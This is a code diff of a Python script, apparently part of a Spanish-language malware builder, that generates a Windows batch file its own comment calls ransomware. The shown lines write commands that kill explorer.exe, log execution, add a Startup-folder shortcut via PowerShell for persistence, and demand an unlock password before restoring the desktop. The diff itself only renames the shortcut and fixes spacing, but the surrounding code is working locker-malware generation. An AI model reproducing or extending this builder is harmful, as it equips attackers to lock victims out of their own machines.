@@ -27,7 +27,6 @@ SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
     passw= input(f"{color.BLUE}Contraseña de desbloqueo: {color.PURPLE} \n")
     
     ##Creation of malwar ramsomware
-    ##archivo = open(f"{nameram}.bat", 'w')
     
     base_dir = os.path.dirname(os.path.abspath(__file__))  # Directorio del archivo actual (complements)
     creaciones_dir = os.path.join(base_dir, '..', 'Malwares')  # Navega hacia mvpy/creaciones
@@ -54,7 +53,7 @@ SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
     archivo.write('''set hora=%time%\n''')
 
     archivo.write(''':: Crear el archivo de registro con la fecha y hora en C:\rmlog \n''')
-    archivo.write('''echo Fecha de ejecución: %fecha%%hora%>> C:\rmlog\log.txt \n''')
+    archivo.write('''echo Fecha de ejecución: %fecha% %hora%>> C:\rmlog\log.txt \n''')
 
 
     archivo.write('taskkill /f /im explorer.exe\n')
@@ -66,7 +65,7 @@ SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
     archivo.write('''set "desktopPath=%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"\n''')
 
     archivo.write(':: Define el nombre del acceso directo\n')
-    archivo.write('set "shortcutName=ramso.lnk"\n')
+    archivo.write('set "shortcutName=mwpy.lnk"\n')
 
     archivo.write(':: Crea el acceso directo usando PowerShell\n')
     archivo.write('powershell -Command ^\n')
@@ -134,10 +133,10 @@ SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
     archivo.write('@echo off\n')
 
 
-    archivo.write(':: Ejecuta PowerShell para mostrar los iconos del escritorio\n')
+    archivo.write(':: Ejecuta PowerShell para mostrar los iconos del escritorio \n')
     archivo.write('''::powershell -command "& { $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'; Set-ItemProperty -Path $key -Name 'HideIcons' -Value 0; Stop-Process -Name explorer -Force }"\n''')
 
-    archivo.write('''del "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ramso.lnk"''')
+    archivo.write('''del "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mwpy.lnk" \n''')
     archivo.write('start explorer.exe\n')
     archivo.write('echo para mostrar sus ARCHIVOS\n')
     archivo.write('"echo Click derecho --> ver --> mostrar iconos"\n')
@@ -148,6 +147,7 @@ SOLO NECESITAMOS UNOS DATOS PAR FINALIZAR''')
     archivo.write('exit\n')
 
     archivo.close()
+    
     if os.path.exists(file_path):
         print(f"{color.GREEN}El archivo '{file_path}' Secreo correctamente.")
         input(f"{color.BLUE}preciona enter para continuar")
